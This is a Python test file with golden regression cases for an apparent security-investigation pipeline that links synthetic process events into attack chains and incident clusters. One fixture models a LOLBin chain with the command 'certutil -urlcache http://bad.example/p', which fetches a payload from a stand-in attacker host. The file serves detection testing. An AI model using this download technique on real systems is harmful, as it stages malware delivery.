"""Attack Chain Golden Corpus — hand-crafted cases + expected outcomes.

Owner-approved (2026-02-XX) permanent regression set. These are NOT
unit tests of individual functions; they are end-to-end scenarios that
validate the *observable behaviour* of the full pipeline segment:

    CEM → Investigation Graph → Timeline → Attack Chain → Correlation

Every case captures:
    * A hand-crafted list of CEM events describing an attack storyline
    * The expected number and kinds of AttackEdges
    * The expected number of IncidentClusters at the default threshold

Rule: never let these regress. If a legitimate architectural change
alters expectations, the golden values change alongside the code — and
the diff itself becomes the audit record.
"""
from __future__ import annotations

import hashlib
from datetime import datetime, timedelta, timezone
from typing import Dict, List, Tuple

import pytest

from nivxforge.investigation.cem import (
    CanonicalEvent, CanonicalEventModel, EventKind, Host, Process,
    Provenance,
)
from nivxforge.investigation.pipeline.attack_chain_builder import (
    build as build_chain,
)
from nivxforge.investigation.pipeline.correlation_engine import (
    build_from_graph as build_correlation,
)
from nivxforge.investigation.pipeline.graph_builder import (
    GraphEdge, GraphNode, InvestigationGraph,
)
from nivxforge.investigation.pipeline.timeline_builder import (
    build as build_timeline,
)


_T0 = datetime(2026, 2, 1, 12, 0, 0, tzinfo=timezone.utc)
_PROV = Provenance(source="golden-corpus", timestamp=_T0)


# ── Shared fabricator (same shape as attack-chain tests) ────────────

def _process_node(image: str) -> GraphNode:
    h = hashlib.sha256(image.encode()).hexdigest()[:12]
    return GraphNode(id=f"process-{h}", kind="process",
                      label=f"PROCESS · {image}", value=image)


def _command_node(cmd: str) -> GraphNode:
    h = hashlib.sha256(cmd.encode()).hexdigest()[:12]
    return GraphNode(id=f"command-{h}", kind="command",
                      label=f"COMMAND · {cmd}", value=cmd)


def _host_node(name: str) -> GraphNode:
    h = hashlib.sha256(name.encode()).hexdigest()[:12]
    return GraphNode(id=f"host-{h}", kind="host",
                      label=f"HOST · {name}", value=name)


def _edge(relation: str, src: str, dst: str, event_id: str) -> GraphEdge:
    eid = hashlib.sha256(
        f"{relation}::{src}::{dst}::{event_id}".encode()
    ).hexdigest()[:12]
    return GraphEdge(id=f"e-{eid}", from_id=src, to_id=dst,
                      relation=relation, evidence_refs=(event_id,))


def _cem_event(event_id: str, image: str, cmd: str, host: str,
                seconds: int, parent_cmd: str = "") -> CanonicalEvent:
    return CanonicalEvent(
        event_id=event_id, kind=EventKind.process_create,
        timestamp=_T0 + timedelta(seconds=seconds),
        host=Host(name=host, provenance=_PROV),
        process=Process(image=image, command_line=cmd,
                        parent_command_line=(parent_cmd or None),
                        provenance=_PROV),
        provenance=_PROV,
    )


def _pipeline(events: List[CanonicalEvent]):
    nodes: Dict[str, GraphNode] = {}
    edges: List[GraphEdge] = []
    for evt in events:
        for n in (_process_node(evt.process.image),
                  _command_node(evt.process.command_line),
                  _host_node(evt.host.name)):
            nodes[n.id] = n
        edges.append(_edge("executed_on",
                            _process_node(evt.process.image).id,
                            _host_node(evt.host.name).id,
                            evt.event_id))
        edges.append(_edge("belongs_to",
                            _command_node(evt.process.command_line).id,
                            _process_node(evt.process.image).id,
                            evt.event_id))
        if evt.process.parent_command_line:
            parent_cmd = _command_node(evt.process.parent_command_line)
            nodes[parent_cmd.id] = parent_cmd
            edges.append(_edge(
                "child_of",
                _command_node(evt.process.command_line).id,
                parent_cmd.id, evt.event_id))
    graph = InvestigationGraph(nodes=tuple(nodes.values()),
                                edges=tuple(edges))
    cem = CanonicalEventModel(vendor="golden", vendor_route="corpus",
                                provenance=_PROV, events=events)
    tl = build_timeline(cem, graph)
    ac = build_chain(tl, graph)
    corr = build_correlation(tl, ac, graph)
    return tl, ac, corr, graph


# ── Golden case 001 · Classic LOLBin chain ───────────────────────────
#
#   cmd.exe  ─┐
#             ├─ parent_of ──▶  powershell.exe
#             │                    │
#             │                    └─ parent_of ──▶  certutil.exe
#             │                                        │
#             │                                        └─ parent_of ──▶  payload.exe
#
# Expected:
#   * 4 timeline events, all timestamped
#   * 3 parent_of edges (every step has explicit parent-child)
#   * additional led_to / same_context edges (grandparent → grandchild)
#   * exactly 1 IncidentCluster at the default threshold

def test_case_001_lolbin_chain_cmd_ps_certutil_payload():
    events = [
        _cem_event("e1", "cmd.exe", "cmd /c stage1", "host-x", 0),
        _cem_event("e2", "powershell.exe",
                   "powershell -c stage2", "host-x", 3,
                   parent_cmd="cmd /c stage1"),
        _cem_event("e3", "certutil.exe",
                   "certutil -urlcache http://bad.example/p", "host-x", 6,
                   parent_cmd="powershell -c stage2"),
        _cem_event("e4", "payload.exe", "payload -r", "host-x", 9,
                   parent_cmd="certutil -urlcache http://bad.example/p"),
    ]
    tl, ac, corr, _ = _pipeline(events)

    # Timeline expectations
    assert len(tl.entries) == 4
    assert tl.unknown_time_count == 0

    # Attack Chain expectations
    kinds = ac.edge_kinds
    assert kinds.get("parent_of", 0) == 3, kinds
    assert kinds.get("parent_of", 0) + kinds.get("led_to", 0) + \
           kinds.get("same_context", 0) == len(ac.edges)

    # Every parent_of edge must carry the graph_child_of_edge rule fired.
    parent_edges = [e for e in ac.edges if e.kind == "parent_of"]
    for pe in parent_edges:
        fired_rules = {r.name for r in pe.derivation_rules
                       if r.observed is True}
        assert "graph_child_of_edge" in fired_rules
        # Supporting evidence must include the graph_edge that fired it.
        ev_types = {ref.type for ref in pe.supporting_evidence}
        assert "graph_edge" in ev_types
        assert "cem_event" in ev_types
        assert "timeline_event" in ev_types

    # Correlation expectation
    assert len(corr.clusters) == 1
    cluster = corr.clusters[0]
    assert len(cluster.timeline_event_ids) == 4


# ── Golden case 002 · Same actor, no explicit parent ─────────────────
#
#   attacker.exe (run 1)  ──▶ attacker.exe (run 2)
#   Same host, same image, 8 seconds apart.
#   Expected: exactly one `led_to` edge (no parent_of, no same_context
#   because no shared_process_tree without a child_of edge).

def test_case_002_same_actor_led_to_only():
    events = [
        _cem_event("e1", "attacker.exe", "attacker -a", "host-x", 0),
        _cem_event("e2", "attacker.exe", "attacker -b", "host-x", 8),
    ]
    tl, ac, corr, _ = _pipeline(events)
    assert len(tl.entries) == 2
    assert ac.edge_kinds == {"led_to": 1}
    assert len(corr.clusters) == 1


# ── Golden case 003 · Cross-host events must NOT merge ───────────────

def test_case_003_cross_host_events_stay_separate():
    events = [
        _cem_event("e1", "att.exe", "att -a", "host-a", 0),
        _cem_event("e2", "att.exe", "att -b", "host-b", 5),
    ]
    tl, ac, corr, _ = _pipeline(events)
    assert len(tl.entries) == 2
    assert ac.edges == ()
    assert corr.clusters == ()
    assert len(corr.orphan_event_ids) == 2


# ── Golden case 004 · Missing timestamps do NOT produce edges ────────

def test_case_004_missing_timestamps_no_temporal_edges():
    events = [
        CanonicalEvent(event_id="e1", kind=EventKind.process_create,
                        host=Host(name="host-x", provenance=_PROV),
                        process=Process(image="att.exe",
                                        command_line="att -a",
                                        provenance=_PROV),
                        provenance=_PROV),
        CanonicalEvent(event_id="e2", kind=EventKind.process_create,
                        host=Host(name="host-x", provenance=_PROV),
                        process=Process(image="att.exe",
                                        command_line="att -b",
                                        provenance=_PROV),
                        provenance=_PROV),
    ]
    tl, ac, corr, _ = _pipeline(events)
    # No led_to (timestamps unknown → within_30_seconds unverifiable).
    assert "led_to" not in ac.edge_kinds
    # No parent_of (no parent_command_line).
    assert "parent_of" not in ac.edge_kinds
    # Both events must become orphans in Correlation.
    assert corr.clusters == ()
    assert len(corr.orphan_event_ids) == 2


# ── Golden case 005 · Grandchild via process tree ────────────────────
#
#   cmd → powershell → child.exe   (all with explicit parent lines)
#   Expected:
#     * parent_of(cmd → powershell)
#     * parent_of(powershell → child)
#     * same_context(cmd → child)  (grandchild — no direct child_of)
#   All at the same host, well within 5 minutes.

def test_case_005_grandchild_same_context_edge():
    events = [
        _cem_event("e1", "cmd.exe", "cmd /c a", "host-x", 0),
        _cem_event("e2", "powershell.exe",
                   "powershell -c b", "host-x", 5,
                   parent_cmd="cmd /c a"),
        _cem_event("e3", "child.exe", "child -c", "host-x", 20,
                   parent_cmd="powershell -c b"),
    ]
    tl, ac, corr, _ = _pipeline(events)
    kinds = ac.edge_kinds
    assert kinds.get("parent_of", 0) == 2
    # cmd → child is a grandchild pair: no direct child_of edge, same
    # host + same tree + within 5min → same_context.
    assert kinds.get("same_context", 0) == 1
    # cmd → child is also within 30s (20 seconds) with same host but
    # different actor images ⇒ led_to must NOT fire.
    assert kinds.get("led_to", 0) == 0

    assert len(corr.clusters) == 1
    cluster = corr.clusters[0]
    assert set(cluster.timeline_event_ids) == {
        e.id for e in tl.entries}


# ── Golden case 006 · Determinism guard ──────────────────────────────

def test_case_006_pipeline_is_byte_deterministic():
    """Golden invariant: same CEM → identical AttackChain +
    Correlation payloads. Any accidental non-determinism (e.g. dict
    iteration, unsorted edge assembly) will fail this test."""
    events = [
        _cem_event("e1", "cmd.exe", "cmd /c a", "host-x", 0),
        _cem_event("e2", "powershell.exe",
                   "powershell -c b", "host-x", 5,
                   parent_cmd="cmd /c a"),
        _cem_event("e3", "child.exe", "child -c", "host-x", 20,
                   parent_cmd="powershell -c b"),
    ]
    _, ac_a, corr_a, _ = _pipeline(events)
    _, ac_b, corr_b, _ = _pipeline(events)
    assert ac_a.to_dict() == ac_b.to_dict()
    assert corr_a.to_dict() == corr_b.to_dict()


# ── Registered golden cases (metadata for reporting) ─────────────────

GOLDEN_CASES = {
    "case_001_lolbin_chain":       "cmd → ps → certutil → payload",
    "case_002_same_actor_led_to":  "attacker.exe run twice",
    "case_003_cross_host":         "same actor, different hosts",
    "case_004_missing_timestamps": "unknown timestamps → no temporal edges",
    "case_005_grandchild":         "cmd → ps → child (grandchild edge)",
    "case_006_determinism":        "byte-identical repeat",
}


def test_golden_corpus_registration_metadata_present():
    """Cheap sanity — every golden test has a documented case id.
    Guards against silently deleting a scenario."""
    assert set(GOLDEN_CASES.keys()) == {
        "case_001_lolbin_chain", "case_002_same_actor_led_to",
        "case_003_cross_host", "case_004_missing_timestamps",
        "case_005_grandchild", "case_006_determinism",
    }
